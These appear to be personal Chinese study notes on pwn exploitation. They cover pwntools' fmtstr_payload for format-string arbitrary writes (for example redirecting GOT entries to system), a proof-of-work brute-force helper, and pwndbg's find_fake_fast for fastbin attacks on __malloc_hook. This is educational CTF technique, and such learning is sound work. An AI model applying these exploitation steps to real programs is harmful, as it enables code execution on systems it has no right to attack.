格式化字符串漏洞

任意地址写
直接使用pwntools的fmtstr_payload函数
如：需要在0xffffdafc该地址上写入数据0x5201314
fmtstr_payload(7,{0xffffdafc:0x5201314})
前提是需要先确定好字符串的偏移量，这上面为7

fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322
第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
fmtstr_payload函数返回的就是payload

格式化字符串偏移量查找：
fmtarg 0xffffff

修改多个地址的值：
payload=fmtstr_payload(6,{atoi_got:system_plt+6,system_got:main})

def PoW(hash_value, part):
    alphabet = string.ascii_letters + string.digits
    for x in itertools.product(alphabet, repeat=4):
        nonce = ''.join(x)
        if sha256((nonce + part).encode()).hexdigest() == hash_value:
            return nonce

find_fake_fast

Fastbin attack在申请堆块时会对chunk的size域进行检查，因此在申请时，需要对size域的检查进行绕过。
将堆块申请到malloc_hook附近，从而修改malloc_hook的内容，可以使用pwndbg自带的命令：
find_fake_fast 0x7ffff7dd1b10 0x70
0x7ffff7dd1b10为main_arena的地址或想要修改的内容
0x70为想要申请的fake_chunk的size，一般为0x70
Print (viod *)&main_arena为打印main_arena的地址
Print (void *)&__malloc_hook
